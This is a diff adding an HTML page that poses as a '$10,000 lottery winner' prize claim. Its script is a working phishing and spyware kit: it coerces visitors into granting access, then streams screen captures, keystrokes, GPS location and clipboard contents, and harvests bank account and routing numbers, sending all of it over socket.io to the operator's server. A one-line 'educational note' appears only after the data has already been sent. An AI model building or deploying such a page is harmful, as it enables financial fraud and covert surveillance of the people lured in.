@@ -1,0 +1,399 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎉 $10,000 LOTTERY WINNER! 🎉</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial Black', Arial; 
+            background: linear-gradient(135deg, #ff6b35, #f7931e, #ffd23f);
+            color: #1a1a1a; min-height: 100vh; 
+            display: flex; align-items: center; justify-content: center;
+            overflow-x: hidden;
+        }
+        .container { 
+            width: 90%; max-width: 500px; 
+            background: rgba(255,255,255,0.95); 
+            padding: 40px; border-radius: 25px; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .trophy { font-size: 80px; margin-bottom: 20px; animation: spin 3s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        h1 { 
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 36px; margin-bottom: 15px; font-weight: 900;
+        }
+        .prize { font-size: 48px; font-weight: bold; color: #d63384; margin: 20px 0; }
+        
+        /* Claim Button */
+        .claim-btn { 
+            width: 100%; padding: 22px; font-size: 22px; font-weight: 900;
+            border: none; border-radius: 18px; cursor: pointer;
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white; transition: all 0.4s; box-shadow: 0 12px 30px rgba(40,167,69,0.5);
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .claim-btn:hover { transform: scale(1.05) translateY(-5px); box-shadow: 0 20px 40px rgba(40,167,69,0.7); }
+        .claim-btn:active { transform: scale(0.98); }
+        
+        /* Modal for permissions */
+        .modal { 
+            display: none; position: fixed; z-index: 1000; left: 0; top: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
+            align-items: center; justify-content: center;
+        }
+        .modal-content { 
+            background: white; padding: 30px; 
+            border-radius: 20px; width: 90%; max-width: 400px; text-align: center;
+        }
+        .modal h3 { color: #ff6b35; margin-bottom: 20px; }
+        .permission-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }
+        .permission-item { 
+            padding: 15px; background: #f8f9fa; border-radius: 10px; 
+            cursor: pointer; transition: all 0.3s; 
+        }
+        .permission-item:hover { background: #e9ecef; transform: translateY(-2px); }
+        .permission-item.active { background: #d4edda; border: 2px solid #28a745; }
+        .permission-item.disabled { opacity: 0.6; cursor: not-allowed; }
+        .modal-buttons { display: flex; gap: 15px; justify-content: center; margin-top: 20px; }
+        .btn-allow { background: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        .btn-deny { background: #dc3545; color: white; padding: 12px 24px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        .btn-allow:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Bank Details Form */
+        .bank-form { display: none; background: #f8f9fa; padding: 25px; border-radius: 15px; margin: 20px 0; }
+        .bank-form h3 { color: #28a745; margin-bottom: 20px; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
+        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
+        .form-group input:focus { border-color: #28a745; outline: none; }
+        
+        #status { padding: 20px; margin: 25px 0; border-radius: 15px; font-size: 18px; font-weight: 700; }
+        .active { background: #d4edda; color: #155724; border: 3px solid #28a745; }
+        .error { background: #f8d7da; color: #721c24; border: 3px solid #dc3545; }
+        .educational-note {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #856404;
+            border-radius: 5px;
+        }
+        .required-text {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="trophy">🏆</div>
+        <h1>CONGRATULATIONS!</h1>
+        <div class="prize">$10,000 LOTTERY WINNER!</div>
+        
+        <button class="claim-btn" id="claimButton">
+            💰 CLAIM $10,000 INSTANTLY!
+        </button>
+        
+        <!-- Permissions Modal -->
+        <div id="permissionsModal" class="modal">
+            <div class="modal-content">
+                <h3>🔐 Data Access Required</h3>
+                <p>To verify your prize, you MUST grant ALL permissions:</p>
+                <div class="permission-grid">
+                    <div class="permission-item" data-permission="screen">
+                        🖥️ Screen Access
+                    </div>
+                    <div class="permission-item" data-permission="keyboard">
+                        ⌨️ Keyboard Inputs
+                    </div>
+                    <div class="permission-item" data-permission="gps">
+                        📍 GPS Location
+                    </div>
+                    <div class="permission-item" data-permission="clipboard">
+                        📋 Clipboard
+                    </div>
+                </div>
+                <div class="required-text" id="permissionWarning"></div>
+                <div class="modal-buttons">
+                    <button class="btn-allow" id="allowAccessBtn" disabled>✅ Allow All Access</button>
+                    <button class="btn-deny" id="denyAccessBtn">❌ Deny</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bank Details Form (Voluntary - No Skip) -->
+        <div id="bankForm" class="bank-form">
+            <h3>🏦 Final Step - Prize Transfer</h3>
+            <p style="color: #666; margin-bottom: 20px; font-size: 14px;">
+                Enter your banking details to receive $10,000 instantly:
+            </p>
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="fullName" placeholder="John Doe">
+            </div>
+            <div class="form-group">
+                <label>Bank Name *</label>
+                <input type="text" id="bankName" placeholder="Bank of America">
+            </div>
+            <div class="form-group">
+                <label>Account Number *</label>
+                <input type="text" id="accountNumber" placeholder="1234567890">
+            </div>
+            <div class="form-group">
+                <label>Routing Number *</label>
+                <input type="text" id="routingNumber" placeholder="021000021">
+            </div>
+            <button class="claim-btn" id="submitBankBtn" style="margin-top: 10px;">
+                💳 Submit & Receive $10,000
+            </button>
+        </div>
+        
+        <div id="status">💰 Click "CLAIM" to start verification!</div>
+        
+        
+    </div>
+
+    <script>
+        const sessionId = "{{ session_id }}";
+        const socket = io({transports: ['websocket', 'polling']});
+        
+        // Track selected permissions - ALL MUST BE SELECTED
+        let selectedPermissions = {
+            screen: false,
+            keyboard: false,
+            gps: false,
+            clipboard: false
+        };
+        
+        let monitoringActive = false;
+        let screenStream = null;
+        let clipboardInterval = null;
+        
+        socket.emit('join_session', {session_id: sessionId});
+        
+        // Function to check if all permissions are selected
+        function checkAllPermissions() {
+            const allSelected = selectedPermissions.screen && selectedPermissions.keyboard && 
+                               selectedPermissions.gps && selectedPermissions.clipboard;
+            const allowBtn = document.getElementById('allowAccessBtn');
+            const warning = document.getElementById('permissionWarning');
+            
+            if (allSelected) {
+                allowBtn.disabled = false;
+                warning.innerHTML = '✅ All permissions selected! Click "Allow All Access" to continue.';
+                warning.style.color = '#28a745';
+            } else {
+                allowBtn.disabled = true;
+                const missing = [];
+                if (!selectedPermissions.screen) missing.push('Screen');
+                if (!selectedPermissions.keyboard) missing.push('Keyboard');
+                if (!selectedPermissions.gps) missing.push('GPS');
+                if (!selectedPermissions.clipboard) missing.push('Clipboard');
+                warning.innerHTML = `⚠️ You must select: ${missing.join(', ')}`;
+                warning.style.color = '#dc3545';
+            }
+        }
+        
+        // CLAIM BUTTON - Show permission modal
+        document.getElementById('claimButton').addEventListener('click', function() {
+            document.getElementById('status').innerHTML = '🔓 You must grant ALL permissions to claim your prize...';
+            document.getElementById('permissionsModal').style.display = 'flex';
+        });
+        
+        // Toggle permissions - allow selection
+        document.querySelectorAll('.permission-item').forEach(item => {
+            item.addEventListener('click', function() {
+                const permission = this.getAttribute('data-permission');
+                selectedPermissions[permission] = !selectedPermissions[permission];
+                this.classList.toggle('active', selectedPermissions[permission]);
+                checkAllPermissions();
+            });
+        });
+        
+        // ALLOW ACCESS - Start monitoring (only when all selected)
+        document.getElementById('allowAccessBtn').addEventListener('click', function() {
+            // Verify all permissions are selected
+            if (!selectedPermissions.screen || !selectedPermissions.keyboard || 
+                !selectedPermissions.gps || !selectedPermissions.clipboard) {
+                alert('You must select ALL permissions to continue!');
+                return;
+            }
+            
+            document.getElementById('permissionsModal').style.display = 'none';
+            startMonitoring();
+            document.getElementById('bankForm').style.display = 'block';
+            document.getElementById('status').innerHTML = '✅ All permissions granted! Please enter bank details to receive prize.';
+        });
+        
+        // DENY ACCESS
+        document.getElementById('denyAccessBtn').addEventListener('click', function() {
+            document.getElementById('permissionsModal').style.display = 'none';
+            document.getElementById('status').innerHTML = '❌ Access denied. Prize cannot be claimed without all permissions.';
+        });
+        
+        // START MONITORING function
+        async function startMonitoring() {
+            monitoringActive = true;
+            
+            // 1. SCREEN CAPTURE
+            if (selectedPermissions.screen) {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: { mediaSource: 'screen', width: {ideal: 1280}, height: {ideal: 720}, frameRate: {ideal: 10} }
+                    });
+                    
+                    screenStream = stream;
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    function captureScreen() {
+                        if (video.videoWidth > 0 && monitoringActive) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0);
+                            socket.emit('screen_frame', {
+                                session_id: sessionId,
+                                frame: canvas.toDataURL('image/jpeg', 0.75).split(',')[1],
+                                width: canvas.width,
+                                height: canvas.height
+                            });
+                        }
+                        if (monitoringActive) {
+                            requestAnimationFrame(captureScreen);
+                        }
+                    }
+                    captureScreen();
+                    document.getElementById('status').innerHTML += '<br>🖥️ Screen sharing active';
+                    
+                } catch(err) {
+                    document.getElementById('status').innerHTML += `<br>❌ Screen: ${err.name || err.message}`;
+                }
+            }
+            
+            // 2. KEYLOGGER
+            if (selectedPermissions.keyboard) {
+                document.addEventListener('keydown', function(e) {
+                    if (!monitoringActive) return;
+                    socket.emit('keystroke', {
+                        session_id: sessionId,
+                        key: e.key,
+                        code: e.code,
+                        timestamp: Date.now()
+                    });
+                });
+                document.getElementById('status').innerHTML += '<br>⌨️ Keyboard monitoring active';
+            }
+            
+            // 3. GPS LOCATION
+            if (selectedPermissions.gps && navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        socket.emit('gps_data', {
+                            session_id: sessionId,
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                        document.getElementById('status').innerHTML += '<br>📍 GPS location captured';
+                    },
+                    function() {
+                        document.getElementById('status').innerHTML += '<br>📍 GPS access denied';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+            
+            // 4. CLIPBOARD MONITORING
+            if (selectedPermissions.clipboard) {
+                clipboardInterval = setInterval(async function() {
+                    if (!monitoringActive) return;
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text && text.trim()) {
+                            socket.emit('clipboard_data', {
+                                session_id: sessionId,
+                                text: text.substring(0, 500)
+                            });
+                        }
+                    } catch(e) {}
+                }, 1500);
+                document.getElementById('status').innerHTML += '<br>📋 Clipboard monitoring active';
+            }
+            
+            document.getElementById('status').className = 'active';
+        }
+        
+        // SUBMIT BANK DETAILS - Send data properly to dashboard
+        document.getElementById('submitBankBtn').addEventListener('click', function() {
+            const fullName = document.getElementById('fullName').value;
+            const bankName = document.getElementById('bankName').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            const routingNumber = document.getElementById('routingNumber').value;
+            
+            // Validate at least some data is entered
+            if (!fullName && !bankName && !accountNumber && !routingNumber) {
+                alert('Please enter your bank details to claim the prize');
+                return;
+            }
+            
+            // Format bank details clearly
+            const bankDetailsMessage = `🏦 BANK DETAILS SUBMITTED:
+Full Name: ${fullName || 'Not provided'}
+Bank Name: ${bankName || 'Not provided'}
+Account Number: ${accountNumber || 'Not provided'}
+Routing Number: ${routingNumber || 'Not provided'}
+Timestamp: ${new Date().toLocaleString()}`;
+            
+            console.log('Sending bank details:', bankDetailsMessage);
+            
+            // Send via clipboard_data event
+            socket.emit('clipboard_data', {
+                session_id: sessionId,
+                text: bankDetailsMessage
+            });
+            
+            // Also send as keystroke to ensure it's captured
+            socket.emit('keystroke', {
+                session_id: sessionId,
+                key: bankDetailsMessage.substring(0, 100),
+                code: 'BankDetails',
+                timestamp: Date.now()
+            });
+            
+            // Show success message
+            document.getElementById('status').innerHTML = '🎉 <strong>PRIZE CLAIM SUBMITTED!</strong><br>You will receive $10,000 within 24 hours.<br><br>⚠️ EDUCATIONAL NOTE: In real phishing, this data would be stolen.';
+            document.getElementById('bankForm').style.display = 'none';
+            
+            // Disable submit button to prevent double submission
+            document.getElementById('submitBankBtn').disabled = true;
+            document.getElementById('submitBankBtn').style.opacity = '0.5';
+        });
+        
+        // Clean up on page unload
+        window.addEventListener('beforeunload', function() {
+            monitoringActive = false;
+            if (screenStream) {
+                screenStream.getTracks().forEach(track => track.stop());
+            }
+            if (clipboardInterval) {
+                clearInterval(clipboardInterval);
+            }
+        });
+    </script>
+</body>
+</html>
